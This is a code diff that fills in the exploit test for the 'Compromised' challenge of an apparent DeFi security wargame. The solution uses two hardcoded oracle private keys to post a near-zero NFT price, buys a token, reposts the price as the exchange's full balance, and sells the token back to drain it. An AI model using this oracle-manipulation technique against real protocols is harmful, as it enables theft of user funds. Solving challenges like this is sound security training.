@@ -1,5 +1,5 @@
 const { expect } = require('chai');
-const { ethers } = require('hardhat');
+const { ethers, waffle } = require('hardhat');
 
 describe('Compromised challenge', function () {
 
@@ -61,6 +61,31 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const provider = waffle.provider;
+
+        const oracleSigner1 = new ethers.Wallet('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', provider);
+        const oracleSigner2 = new ethers.Wallet('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', provider);
+
+        const smallAmount = ethers.utils.parseEther('0.0001');
+        const biggerAmount = ethers.utils.parseEther('0.0002');
+
+        await this.oracle.connect(oracleSigner1).postPrice("DVNFT", smallAmount);
+        await this.oracle.connect(oracleSigner2).postPrice("DVNFT", smallAmount);
+
+        const tokenId = await this.exchange.connect(attacker).callStatic.buyOne({ value: biggerAmount });
+        await this.exchange.connect(attacker).buyOne({ value: biggerAmount });
+       
+        const balance = await provider.getBalance(this.exchange.address);
+
+        await this.oracle.connect(oracleSigner1).postPrice("DVNFT", balance);
+        await this.oracle.connect(oracleSigner2).postPrice("DVNFT", balance);
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+
+        await this.exchange.connect(attacker).sellOne(tokenId);
+
+        await this.oracle.connect(oracleSigner1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(oracleSigner2).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
     after(async function () {
